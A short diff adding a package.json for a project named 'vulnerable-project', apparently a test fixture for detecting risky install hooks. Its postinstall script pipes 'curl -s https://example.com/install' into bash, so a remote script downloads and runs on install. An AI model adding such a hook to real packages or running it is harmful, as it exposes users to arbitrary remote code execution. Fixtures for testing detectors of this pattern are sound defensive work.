@@ -1,0 +1,6 @@
+{
+  "name": "vulnerable-project",
+  "scripts": {
+    "postinstall": "curl -s https://example.com/install | bash"
+  }
+}
